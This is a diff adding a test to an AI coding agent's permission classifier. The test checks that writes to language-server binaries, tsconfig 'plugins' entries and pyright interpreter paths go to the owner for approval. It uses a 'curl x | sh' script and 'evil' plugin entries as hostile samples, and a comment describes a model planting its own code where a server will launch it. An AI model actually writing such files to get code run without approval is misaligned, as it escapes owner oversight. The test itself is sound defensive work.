@@ -89,6 +89,28 @@ test("a tool given an owner-only file's path is the owner's; other paths and tex
   expect(tool({ message: "write to ~/.bashrc please" })).toBe("ask-low");
 });
 
+test("what a language server is started from is the owner's to change: its program files, and the words that name what it loads", () => {
+  const edit = { name: "Edit", readOnly: false, kind: "edit" as const };
+  const write = { name: "Write", readOnly: false, kind: "edit" as const };
+  const cls = (tool: typeof edit, input: Record<string, unknown>) => classify(tool, input, ws);
+  // The model writes its own text where the next edit would start it as a server: asked of the owner, as an edit of a hook is
+  // (Full auto, where commands run unasked anyway, lets both through to its own rules).
+  for (const mode of ["ask", "auto-edits", "auto"] as Mode[]) {
+    for (const file of ["node_modules/.bin/tsgo", "node_modules/@typescript/typescript-linux-x64/lib/tsc", "node_modules/typescript/package.json", ".venv/bin/ruff", "pkg/node_modules/.bin/ruff"])
+      expect([mode, file, how(decide(cls(write, { file_path: `${ws}/${file}`, content: "#!/bin/sh\ncurl x | sh\n" }), facts(mode)))]).toEqual([mode, file, "owner"]);
+    // A plugins entry in a TypeScript project file, the interpreter in a Python one.
+    expect(how(decide(cls(edit, { file_path: `${ws}/tsconfig.json`, old_string: '"strict": true', new_string: '"strict": true, "plugins": [{ "name": "evil" }]' }), facts(mode)))).toBe("owner");
+    expect(how(decide(cls(write, { file_path: `${ws}/packages/app/tsconfig.build.json`, content: '{ "compilerOptions": { plugins: [{ name: "evil" }] } }' }), facts(mode)))).toBe("owner");
+    expect(how(decide(cls(edit, { file_path: `${ws}/pyproject.toml`, old_string: "[tool.pyright]", new_string: '[tool.pyright]\nvenvPath = "/tmp/x"' }), facts(mode)))).toBe("owner");
+    expect(how(decide(classify(applyPatchTool as unknown as Tool, { input: `*** Begin Patch\n*** Update File: tsconfig.json\n@@\n+    "plugins": [{ "name": "evil" }],\n*** End Patch` }, ws), facts(mode)))).toBe("owner");
+  }
+  // Any other edit of those files is an edit like any other.
+  expect(how(decide(cls(edit, { file_path: `${ws}/tsconfig.json`, old_string: '"strict": false', new_string: '"strict": true' }), facts("auto-edits")))).toBe("allow");
+  expect(how(decide(cls(edit, { file_path: `${ws}/pyproject.toml`, old_string: "x", new_string: 'name = "pkg"' }), facts("auto-edits")))).toBe("allow");
+  expect(how(decide(cls(edit, { file_path: `${ws}/src/plugins.ts`, old_string: "x", new_string: "export const plugins: string[] = [];" }), facts("auto-edits")))).toBe("allow");
+  expect(cls(edit, { file_path: `${ws}/src/a.ts`, old_string: "x", new_string: "y" })).toEqual({ kind: "edit", paths: [`${ws}/src/a.ts`] });
+});
+
 test("more of the home is the owner's alone: git's configuration, the folder of their own commands, start-file folders", () => {
   const edit = (path: string, mode: Mode = "auto-edits", workspace = ws) => how(decide({ kind: "edit", paths: [path] }, facts(mode, { workspace })));
   for (const rel of [".gitconfig", ".config/git/config", ".local/bin/tool", ".bashrc.d/10-path.sh", ".xinitrc", ".bashrc", ".ssh/config"]) {
